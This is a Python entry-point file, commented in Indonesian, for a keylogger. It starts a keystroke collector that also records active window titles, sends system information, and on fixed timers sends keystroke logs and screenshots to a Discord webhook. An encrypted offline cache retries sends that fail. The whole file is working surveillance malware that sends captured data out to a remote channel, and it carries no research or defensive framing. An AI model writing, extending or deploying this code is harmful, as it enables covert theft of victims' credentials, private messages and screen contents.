"""
main.py — Keylogger Entry Point
================================
Orkestrasi seluruh modul:
  • Keyboard collector  → catat keystroke + window aktif
  • Screenshot timer    → kirim gambar berkala ke Discord
  • Log report timer    → kirim buffer teks berkala ke Discord
  • Offline cache       → retry otomatis jika Discord tidak tersedia

Konfigurasi via file .env (salin dari .env.example).
"""

import logging
import os
import sys
import threading
from datetime import datetime
from pathlib import Path

from dotenv import load_dotenv

# ── Load .env ─────────────────────────────────────────────────────────────────
load_dotenv(Path(__file__).parent / ".env")

WEBHOOK_URL       = os.getenv("DISCORD_WEBHOOK_URL", "")
LOG_INTERVAL      = int(os.getenv("LOG_INTERVAL", "60"))
SCREENSHOT_INTERVAL = int(os.getenv("SCREENSHOT_INTERVAL", "120"))
FERNET_KEY        = os.getenv("FERNET_KEY", "")

# ── Logging setup ─────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)],
)
logger = logging.getLogger("main")

# ── Import modul project ──────────────────────────────────────────────────────
from collectors.keyboard import KeyboardCollector
from collectors.screen   import capture_screenshot
from sender.discord      import DiscordSender
from utils.cache         import OfflineCache
from utils.crypto        import make_cipher
from utils.system_info   import get_system_info


# ─────────────────────────────────────────────────────────────────────────────
class Controller:
    """
    Kelas pusat yang mengelola semua thread dan timer.
    """

    def __init__(self) -> None:
        logger.info("Menginisialisasi Controller...")

        # Komponen utama
        self.sender   = DiscordSender(WEBHOOK_URL)
        cipher        = make_cipher(FERNET_KEY)
        self.cache    = OfflineCache(cipher)
        self.keyboard = KeyboardCollector()

        # Timer handles (agar bisa dibatalkan saat shutdown)
        self._log_timer:    threading.Timer | None = None
        self._screen_timer: threading.Timer | None = None

    # ── Lifecycle ──────────────────────────────────────────────────────────────

    def start(self) -> None:
        """Jalankan semua komponen."""
        logger.info("Starting keylogger...")

        # 1. Kirim system info sebagai pesan pertama
        self._send_system_info()

        # 2. Mulai keyboard listener
        self.keyboard.start()

        # 3. Jadwalkan timer berulang
        self._schedule_log_report()
        self._schedule_screenshot()

        logger.info(
            "Berjalan. Log setiap %ds | Screenshot setiap %ds",
            LOG_INTERVAL, SCREENSHOT_INTERVAL,
        )

    def stop(self) -> None:
        """Hentikan semua timer dan listener."""
        logger.info("Shutting down...")
        if self._log_timer:
            self._log_timer.cancel()
        if self._screen_timer:
            self._screen_timer.cancel()
        self.keyboard.stop()
        logger.info("Controller stopped.")

    # ── Timer: Log Report ──────────────────────────────────────────────────────

    def _schedule_log_report(self) -> None:
        self._log_timer = threading.Timer(LOG_INTERVAL, self._run_log_report)
        self._log_timer.daemon = True
        self._log_timer.start()

    def _run_log_report(self) -> None:
        """Flush buffer keyboard → kirim ke Discord (dengan retry via cache)."""
        log_text = self.keyboard.flush()

        # Coba kirim cache lama terlebih dahulu
        self.cache.flush(self.sender.send_text)

        if log_text:
            ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            message = f"**[KeyLog | {ts}]**\n```\n{log_text}\n```"
            ok = self.sender.send_text(message)
            if not ok:
                logger.warning("Kirim log gagal. Menyimpan ke cache...")
                self.cache.push(message)
        else:
            logger.info("Buffer kosong, tidak ada yang dikirim.")

        # Jadwalkan ulang
        self._schedule_log_report()

    # ── Timer: Screenshot ──────────────────────────────────────────────────────

    def _schedule_screenshot(self) -> None:
        self._screen_timer = threading.Timer(SCREENSHOT_INTERVAL, self._run_screenshot)
        self._screen_timer.daemon = True
        self._screen_timer.start()

    def _run_screenshot(self) -> None:
        """Ambil screenshot → kirim ke Discord sebagai file attachment."""
        try:
            img_bytes = capture_screenshot()
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"screenshot_{ts}.png"
            caption = f"📸 **Screenshot** | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

            ok = self.sender.send_file(img_bytes, filename, caption)
            if not ok:
                logger.warning("Kirim screenshot gagal (tidak di-cache karena ukuran besar).")
        except RuntimeError as exc:
            logger.error("Screenshot error: %s", exc)

        # Jadwalkan ulang
        self._schedule_screenshot()

    # ── Helpers ────────────────────────────────────────────────────────────────

    def _send_system_info(self) -> None:
        info = get_system_info()
        header = "🖥️ **Keylogger Started**\n"
        ok = self.sender.send_text(header + info)
        if not ok:
            logger.warning("Gagal mengirim system info ke Discord.")


# ─────────────────────────────────────────────────────────────────────────────

def main() -> None:
    controller = Controller()
    controller.start()

    # Blokir main thread agar program tidak langsung keluar
    try:
        threading.Event().wait()
    except KeyboardInterrupt:
        logger.info("KeyboardInterrupt diterima.")
    finally:
        controller.stop()


if __name__ == "__main__":
    main()
